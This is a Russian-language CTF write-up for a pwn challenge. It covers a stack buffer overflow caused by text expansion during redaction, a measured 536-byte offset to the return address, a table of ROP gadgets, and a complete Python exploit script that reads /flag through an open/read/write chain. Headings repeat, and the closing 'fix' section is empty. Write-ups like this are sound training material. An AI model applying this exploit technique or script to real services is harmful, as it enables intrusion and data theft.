# Hack.lu CTF: declassifier (pwn)

Oct 25, 2026 · @Demian

**Категория:** pwn · **Тип:** stack buffer overflow через расширение текста → ROP.

Выдают «инструмент для деклассификации», который прячет кодовое имя секретного проекта: он заменяет в тексте каждое вхождение `flux` на `[REDACTED]`. Замена длиннее совпадения (10 байт против 4) и пишется прямо в 512-байтный буфер на стеке без проверки границ. Достаточное число совпадений раздувает строку за пределы буфера и затирает адрес возврата. Бинарь собран статически, без PIE и без stack-канарейки, поэтому перезапись сразу даёт захват потока управления и чистый ROP по фиксированным адресам.

**Что дают:**

| Файл | Что это |
| --- | --- |
| `declass` | статический x86-64 ELF, не stripped, с debug-инфой |
| `declass.c` | исходник «редактора» |
| `Dockerfile`, `compose.yml` | сборка/запуск сервиса |
| `entrypoint.sh` | кладёт флаг в `/flag` и поднимает `socat tcp-listen:1024,fork exec:./declass` |

**Итоговый эксплойт:** переполнение → ROP-цепочка `open("/flag")` → `read` → `write(1, ...)`, флаг уходит обратно в сокет.

## Recon

## Recon

Сердце задачи — функция `redact()`, которая делает замену «на месте»:

```c
static const char *const re = "flux";
static const char *const replace = "[REDACTED]";

static void redact(char buf[], size_t size) {
    // ... regexec ищет "flux" в s ...
    off = pmatch[0].rm_so + (s - buf);
    len = pmatch[0].rm_eo - pmatch[0].rm_so;      // len = 4
    remaining = remaining - pmatch[0].rm_so - len;
    memcpy(&buf[off+strlen(replace)], &buf[off+len], remaining); // сдвиг хвоста на +6
    memcpy(&buf[off], replace, strlen(replace));                 // вписываем "[REDACTED]"
    s += pmatch[0].rm_so + strlen(replace);
}

int main(void) {
    char buf[512] = { 0 };
    size_t n = read(STDIN_FILENO, buf, sizeof(buf));  // до 512 байт
    redact(buf, n);
    printf("%s", buf);
}
```

Защиты бинарника (флаги из `Makefile`: `-static -no-pie -fno-stack-protector`):

| Защита | Состояние | Последствие |
| --- | --- | --- |
| Stack canary | НЕТ | адрес возврата перезаписывается напрямую |
| PIE | НЕТ (EXEC) | адреса кода, гаджетов и `.bss` фиксированы |
| NX | ДА | shellcode на стеке нельзя → нужен ROP |
| Статика | ДА | весь glibc внутри → гаджетов море, утечки не нужны |

Ключевое наблюдение: `read()` читает максимум 512 байт и сам по себе буфер не переполняет. Переполнение создаёт сама замена: каждое `flux` → `[REDACTED]` удлиняет строку на 6 байт, а проверки границ `buf[512]` нет.

## Уязвимость: переполнение за счёт расширения текста

## Уязвимость: переполнение за счёт расширения текста

Алгоритм `redact()` — это, по сути, `buf = buf.replace("flux", "[REDACTED]")`, выполненный на месте. На первый взгляд смущает `memcpy` с перекрытием (`dst = src + 6`) — оптимизированный glibc-шный `memcpy` мог бы «размазать» хвост. Но проверка на той же статической сборке показала, что результат байт-в-байт совпадает с чистым `str.replace`. Значит, байты, которые лягут на адрес возврата, полностью под нашим контролем — нужно лишь довести длину вывода до нужного смещения.

**Раскладка кадра `main`** (из дизассемблера):

```text
sub rsp, 0x210          ; buf = rbp-0x210  (512 байт + 16 выравнивания)
...
[rbp-0x210] buf[0]
[rbp-0x08]  n (счётчик read)
[rbp+0x00]  saved RBP   ← смещение 0x210 = 528
[rbp+0x08]  return addr  ← смещение 0x218 = 536
```

Адрес возврата лежит на **смещении 536** от начала `buf`. Чтобы туда дотянуться, вывод должен быть длиннее 536 байт. Из 512-байтного ввода можно получить до 1280 байт вывода (128 × `flux` → 128 × `[REDACTED]`), так что запаса хватает с избытком.

Проверка тождества «`redact` == `str.replace`» дала зелёный свет (оракул — копия с большим буфером и дампом байт):

```text
inlen= 320 cleanlen= 800 match_cleanreplace=True first_diff=-1
inlen= 420 cleanlen= 960 match_cleanreplace=True first_diff=-1
```

## Контроль RIP и смещение

## Контроль RIP и смещение

Эпилог `main` — `leave ; ret`. `leave` делает `mov rsp, rbp ; pop rbp`: байты на смещении 528 уйдут в `rbp` (можно мусор), а `ret` снимет следующие 8 байт — то, что лежит на смещении 536. Дальше ROP-цепочка раскручивается с 536 вверх.

Проверяем в gdb: ввод `"flux"*53 + "A"*6` даёт ровно 536 байт вывода, дальше кладём маркер `HGFEDCBA` (= `0x4142434445464748`):

```text
53 * "flux"  ->  530 байт "[REDACTED]"
+ "AAAAAA"   ->  добиваем до смещения 536
+ "HGFEDCBA" ->  ляжет на адрес возврата
```

На точке останова на `ret`:

```text
rsp = 0x7fffffff7fc8
0x7fffffff7fc8: 0x4142434445464748  0x4343434343434343
[rsp] = 0x4142434445464748  (именно сюда прыгнет ret)
```

Адрес неканонический → SIGSEGV на `ret`. RIP под полным контролем, смещение до адреса возврата — **536**, дальше (544, 552, ...) ложится остальная цепочка.

## Строим ROP-цепочку

## Строим ROP-цепочку

NX включён → строим ROP. Бинарь статический и No-PIE → все гаджеты и `.bss` по фиксированным адресам, утечки не нужны. Строк `/bin/sh` и `/flag` в бинарнике нет, поэтому `/flag` кладём сами в `.bss`, а дальше `open`/`read`/`write`.

Гаджеты искал байтовым поиском (pwntools/ROPgadget недоступны в окружении; линейный objdump не видит невыровненные последовательности):

| Гаджет | Адрес |
| --- | --- |
| `pop rax ; ret` | `0x43eb83` |
| `pop rdi ; pop rbp ; ret` | `0x40422e` |
| `pop rsi ; pop rbp ; ret` | `0x414d31` |
| `mov rdx, rdi ; ret` | `0x44cbc0` |
| `mov [rdi], rax ; ret` | `0x45519b` |
| `syscall ; ret` | `0x415616` |

Две хитрости:

1. **Нет чистого `pop rdx`.** Счётчик для `read`/`write` выставляю через `pop rdi; pop rbp` и затем `mov rdx, rdi`.
2. **`rdx` и `rsi` переживают syscall.** Инструкция `syscall` портит только `rcx`/`r11`, а `read`/`write` не трогают `rdx`/`rsi`. Поэтому `rdx = 0x100` ставлю один раз, а `rsi = BUF` — перед `read` и переиспользую в `write`.

Для `open(path, O_RDONLY=0)` важно, чтобы `rsi=0` (флаги), поэтому `rsi` ставится нулём перед `open`. `/flag` кладётся в `.bss` примитивом `mov [rdi], rax` (8 байт: `"/flag\0\0\0"`). После `open` файл-дескриптор на сервере = 3 (0/1/2 заняты сокетом от socat), поэтому `read(3, ...)` детерминирован.

## Эксплойт

## Эксплойт

Раскладка ввода: `"flux"*53` (→ 530 байт) + `"A"*6` добивают до смещения 536, дальше сама цепочка. Итоговый ввод — 490 байт (≤ 512). Важно: сама цепочка не должна содержать подстроки `flux` (иначе её тоже раздует) — адреса `0x40…` этому условию удовлетворяют.

```python
#!/usr/bin/env python3
import struct, sys, socket, ssl
def p64(x): return struct.pack("<Q", x & (2**64 - 1))

POP_RAX       = 0x43eb83   # pop rax ; ret
POP_RDI_RBP   = 0x40422e   # pop rdi ; pop rbp ; ret
POP_RSI_RBP   = 0x414d31   # pop rsi ; pop rbp ; ret
MOV_RDX_RDI   = 0x44cbc0   # mov rdx, rdi ; ret
WRITE_RDI_RAX = 0x45519b   # mov [rdi], rax ; ret
SYSCALL       = 0x415616   # syscall ; ret
FLAGADDR = 0x4d9b00        # .bss: строка "/flag"
BUF      = 0x4d9c00        # .bss: содержимое файла
JUNK     = 0x4242424242424242
COUNT    = 0x100

def build():
    c  = b""
    # "/flag\0\0\0" -> FLAGADDR
    c += p64(POP_RAX) + b"/flag\x00\x00\x00"
    c += p64(POP_RDI_RBP) + p64(FLAGADDR) + p64(JUNK)
    c += p64(WRITE_RDI_RAX)
    # rdx = COUNT один раз (syscall его не портит)
    c += p64(POP_RDI_RBP) + p64(COUNT) + p64(JUNK)
    c += p64(MOV_RDX_RDI)
    # open("/flag", 0)  -> fd 3
    c += p64(POP_RAX) + p64(2)
    c += p64(POP_RSI_RBP) + p64(0)        + p64(JUNK)
    c += p64(POP_RDI_RBP) + p64(FLAGADDR) + p64(JUNK)
    c += p64(SYSCALL)
    # read(3, BUF, COUNT)
    c += p64(POP_RAX) + p64(0)
    c += p64(POP_RSI_RBP) + p64(BUF) + p64(JUNK)
    c += p64(POP_RDI_RBP) + p64(3)   + p64(JUNK)
    c += p64(SYSCALL)
    # write(1, BUF, COUNT)
    c += p64(POP_RAX) + p64(1)
    c += p64(POP_RDI_RBP) + p64(1) + p64(JUNK)
    c += p64(SYSCALL)
    assert b"flux" not in c
    payload = b"flux" * 53 + b"A" * 6 + c      # ROP с оффсета 536
    assert payload.replace(b"flux", b"[REDACTED]")[536:544] == p64(POP_RAX)
    assert len(payload) <= 512
    return payload

def main():
    host, port = sys.argv[1], int(sys.argv[2])
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(socket.create_connection((host, port)), server_hostname=host)
    s.sendall(build())
    data = b""
    while True:
        try: chunk = s.recv(4096)
        except (ssl.SSLError, OSError): break
        if not chunk: break
        data += chunk
    i = data.find(b"flag{")
    print(data[i:data.find(b"}", i)+1].decode(errors="replace") if i>=0 else data)

if __name__ == "__main__":
    main()
```

Цепочка — 34 qword’а (272 байта), с смещения 536 до 808. Для не-TLS сервиса достаточно заменить `wrap_socket` на голый `socket`.

## Запуск и флаг

## Запуск и флаг

```text
$ python3 solve.py <host> <port>
...AAAAAA..Cflag{...}
```

Перед флагом печатается «эхо» редактора (`printf("%s", buf)` до первого `\0`) и пара непечатных байт — это нормально, флаг идёт следом от `write(1, BUF, 0x100)`. Ловить грепом:

```text
$ python3 solve.py <host> <port> | grep -ao 'flag{.*}'
```

Замечания:

- `entrypoint.sh` по умолчанию кладёт в `/flag` заглушку `flag{fluxxx}`; настоящий флаг приходит через переменную окружения `FLAG`.
- Локальная проверка: `./declass < payload.bin` при наличии `/flag` — читает и печатает содержимое.
- Если сервис без TLS — убрать `ssl`-обёртку. Проверить наличие TLS: `openssl s_client -connect host:port`.
- `read()` в `main` один, без цикла: 490 байт уходят одним `sendall` → одним TLS-рекордом → серверный `read` забирает их целиком.

*(Флаг в райтапе не привожу — подставьте свой с рабочего сервера.)*

## Выводы и фикс
